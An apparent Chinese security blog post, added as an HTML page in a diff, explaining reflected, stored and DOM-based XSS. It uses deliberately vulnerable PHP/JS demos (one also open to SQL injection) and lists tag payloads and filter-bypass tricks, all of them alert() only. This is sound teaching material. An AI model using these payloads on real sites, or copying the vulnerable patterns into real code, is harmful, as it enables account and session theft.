@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <title>
+        XSS总结 |
+        
+        A.M.|P.M.
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
+    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+        <a class="logo-title" href="/">
+            A.M.|P.M.
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/categories"
+                    >
+                        CATEGORIES
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">XSS总结</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span>John_Frod</span>
+                        <span class="level">Lv3</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-calendar"></i> 2021-03-24 16:35:47
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/XSS/">XSS</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="XSS总结"><a href="#XSS总结" class="headerlink" title="XSS总结"></a>XSS总结</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XSS全称跨站脚本(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS，比较合适的方式应该叫做跨站脚本攻击。</p>
+<p>跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。</p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>XSS漏洞可能会给网站带来以下的一些危害：</p>
+<ol>
+<li>网络钓鱼，盗取用户的账号</li>
+<li>获取用户的cookie信息，其中可能存在 Session ID 等信息，攻击者可以利用这些信息冒充用户登陆服务器。</li>
+<li>劫持用户浏览器，强制弹窗，转跳刷流量。</li>
+<li>攻击者能够在一定限度内记录用户的键盘输入。</li>
+<li>攻击者通过CSRF等方式以用户身份执行危险操作。</li>
+<li>获取客户端隐私信息。</li>
+<li>XSS蠕虫。</li>
+<li>利用XSS漏洞扫描用户内网。</li>
+</ol>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号 <code>&lt;</code> 被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，<strong>当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行</strong>。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。</p>
+<p>example:（反射型）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line">&lt;title&gt;XSS原理重现&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss_input&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$xss &#x3D; $_GET[&#39;xss_input&#39;];</span><br><span class="line">echo &#39;你输入的字符为&lt;br&gt;&#39;.$xss;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>这里我们通过GET方法把<code>xss_input</code>参数到后端，后端没有对该参数做任何检查就把该参数显示出来。</p>
+<p>当我们提交这样一段数据：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+<p>浏览器就会把这一段内容当成HTML标签解析，导致里面的 JS 语句被执行，而不是当作文本输出。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308102212318.png" alt="image-20210308102212318"></p>
+<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>反射型跨站脚本（Reflected Cross-site Scripting）也称作非持久型、参数型跨站脚本。反射型XSS只是简单地把用户输入的数据“反射”给浏览器。也就是说，黑客往往需要诱使用户“点击”一个恶意链接，才能攻击成功。</p>
+<p>简介中的 example 就是一个简单的反射型XSS漏洞模板</p>
+<p>我们查看页面元素可以看到我们输入的内容被当作了HTML标签执行。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308102914047.png" alt="image-20210308102914047"></p>
+<p>由于反射型XSS需要用户访问该连接才能实现，因此容易被有安全意识的用户发现，因此攻击者可以利用短网址或者二维码这样的方式来进行障眼法，避免含有攻击代码的URL直接暴露在用户的面前。</p>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型跨站脚本（Stored Cross-site Scripting）也叫持久型XSS，意思是用户提交的数据会被存储在后端（不管是数据库、内存还是文件系统等），当攻击者提交的包含有XSS攻击的代码被存储在后端中，其他用户访问该页面的时候，后端会将数据取出来显示在页面上，这时候用户就会受到XSS攻击，最典型的应用是留言板。</p>
+<p>example：</p>
+<ul>
+<li>首先我们本地新建一个名字叫做<code>xss</code>的数据库，里面新建一个<code>message</code>表，用来存放用户的留言信息，字段名分别是<code>id</code>、<code>username</code>、<code>message</code></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">NAMES</span> utf8mb4;</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`message`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`message`</span>  (</span><br><span class="line">                            <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">                            <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">                            <span class="string">`message`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">                            PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>) <span class="keyword">USING</span> BTREE</span><br><span class="line">) <span class="keyword">ENGINE</span> = MyISAM AUTO_INCREMENT = <span class="number">17</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8 <span class="keyword">COLLATE</span> = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>然后是后端页面</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$db_host &#x3D; &quot;localhost&quot;;</span><br><span class="line">$db_user &#x3D; &quot;root&quot;;</span><br><span class="line">$db_passwd &#x3D; &quot;&quot;;</span><br><span class="line">$db_dbname &#x3D; &quot;xss&quot;;</span><br><span class="line">$conn &#x3D; new mysqli($db_host, $db_user, $db_passwd, $db_dbname);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 前端用户输入表单 --&gt;</span><br><span class="line">&lt;h1&gt;留言板的存储型XSS&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;form  method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;姓名&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;message&quot; placeholder&#x3D;&quot;请输入您的留言&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;*直接将留言插入到数据库中*&#x2F;</span><br><span class="line">$username&#x3D;$_POST[&#39;username&#39;];</span><br><span class="line">$message&#x3D;$_POST[&#39;message&#39;];</span><br><span class="line">if($username and $message)</span><br><span class="line">&#123;</span><br><span class="line">    $sql&#x3D;&quot;INSERT INTO xss.message (&#96;username&#96;, &#96;message&#96;) VALUES (&#39;&#123;$username&#125;&#39;,&#39;&#123;$message&#125;&#39;)&quot;;</span><br><span class="line">    if ($conn-&gt;query($sql) &#x3D;&#x3D;&#x3D; TRUE) &#123;</span><br><span class="line">        echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*查询数据库中的留言信息*&#x2F;</span><br><span class="line">$sql &#x3D; &quot;SELECT username, message FROM xss.message&quot;;</span><br><span class="line">$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">    while($row &#x3D; $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        echo &quot;用户名：&quot; . $row[&quot;username&quot;]. &quot;留言内容:&quot; . $row[&quot;message&quot;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;暂无留言&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308114155994.png" alt="image-20210308114155994"></p>
+<p>当我们构造<code>&lt;script&gt;alert(11)&lt;\script&gt;</code>输入，然后查看数据库</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308114329338.png" alt="image-20210308114329338"></p>
+<p>发现我们的JS攻击语句已经被存储到数据库中。</p>
+<p>当用户访问该页面的时候就会执行该JS语句，再察看页面元素，发现HTML标签被解析出来。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210308115104242.png" alt="image-20210308115104242"></p>
+<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p>
+<p>example:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;DOM Based XSS Demo&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function xsstest()</span><br><span class="line">&#123;</span><br><span class="line">    var str &#x3D; document.getElementById(&quot;input&quot;).value;</span><br><span class="line">    document.getElementById(&quot;output&quot;).innerHTML &#x3D; &quot;&lt;img src&#x3D;&#39;&quot;+str+&quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;output&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;input&quot; size&#x3D;50 value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;submit&quot; onclick&#x3D;&quot;xsstest()&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>功能很简单，用户输入框插入图片地址后，页面会将图片插入在 id=”output” 的 div 标签中，从而显示在网页上。</p>
+<p>当攻击者输入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#39; onerror&#x3D;&#39;javascript:alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>
+<p>会直接在 img 标签中加入 onerror 事件，该事件是当图片加载出错时执行的语句，当我们输入无效的 src 地址导致图片加载出错时就会触发事件，从而实现弹窗效果。</p>
+<h2 id="XSS常用标签"><a href="#XSS常用标签" class="headerlink" title="XSS常用标签"></a>XSS常用标签</h2><h3 id="script"><a href="#script" class="headerlink" title="script"></a>script</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="img"><a href="#img" class="headerlink" title="img"></a>img</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="details"><a href="#details" class="headerlink" title="details"></a>details</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="svg"><a href="#svg" class="headerlink" title="svg"></a>svg</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="video-audio"><a href="#video-audio" class="headerlink" title="video/audio"></a>video/audio</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="a"><a href="#a" class="headerlink" title="a"></a>a</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="form"><a href="#form" class="headerlink" title="form"></a>form</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="XSS常见注入方式"><a href="#XSS常见注入方式" class="headerlink" title="XSS常见注入方式"></a>XSS常见注入方式</h2><ul>
+<li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li>
+<li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li>
+<li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li>
+<li>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</li>
+<li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li>
+<li>在 style 属性和标签中，包含类似 <code>background-image:url(&quot;javascript:...&quot;);</code> 的代码（新版本浏览器已经可以防范）。</li>
+<li>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li>
+</ul>
+<h3 id="HTML无法执行脚本的标签"><a href="#HTML无法执行脚本的标签" class="headerlink" title="HTML无法执行脚本的标签"></a>HTML无法执行脚本的标签</h3><p>在某些标签的内部，通过内嵌引入的脚本是不会执行的，需要通过闭合原有的标签才能执行。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xmp</span>&gt;</span><span class="tag">&lt;/<span class="name">xmp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span> (noscript 元素用来定义在脚本未被执行时的替代内容(文本))</span><br><span class="line"><span class="tag">&lt;<span class="name">noframes</span>&gt;</span><span class="tag">&lt;/<span class="name">noframes</span>&gt;</span> (noframes 元素可为那些不支持框架的浏览器显示文本。noframes 元素位于 frameset 元素内部)</span><br><span class="line"><span class="tag">&lt;<span class="name">plaintext</span>&gt;</span><span class="tag">&lt;/<span class="name">plaintext</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还有一些标签，直接无法嵌套其他标签，系统会提示报错：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="XSS常见绕过方式"><a href="#XSS常见绕过方式" class="headerlink" title="XSS常见绕过方式"></a>XSS常见绕过方式</h2><h3 id="关键字被过滤"><a href="#关键字被过滤" class="headerlink" title="关键字被过滤"></a>关键字被过滤</h3><ul>
+<li><p><strong>使用上述的其他标签代替</strong></p>
+</li>
+<li><p><strong>大小写绕过</strong></p>
+</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ScRipt</span>&gt;</span><span class="javascript">aLErt(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">ScRipt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>双写绕过</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(&#x27;xss&#x27;)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>字符拼接</strong></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><p><strong>编码绕过</strong></p>
+<ul>
+<li>Unicode编码</li>
+</ul>
